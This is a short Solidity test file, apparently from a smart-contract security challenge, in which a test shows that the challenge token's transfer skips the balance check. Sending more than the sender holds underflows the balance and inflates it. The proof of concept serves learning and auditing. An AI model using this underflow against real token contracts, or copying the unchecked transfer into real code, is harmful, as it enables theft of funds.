// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {BaseTest} from "./utils/BaseTest.t.sol";
import {Challenge09} from "src/Challenge09.sol";

contract CounterTest is BaseTest {
    MockToken mockToken;

    function setUp() public {
        mockToken = new MockToken();
    }

    function test_TransferDoesntCheckBalance() public {
        uint256 beforeBalance = mockToken.balanceOf(deployer);

        mockToken.transfer(random, beforeBalance + 1 ether);

        uint256 afterBalance = mockToken.balanceOf(deployer);

        //  integer underflows
        assertGt(afterBalance, beforeBalance);
    }
}

contract MockToken is Challenge09 {
    constructor() Challenge09() {}
}
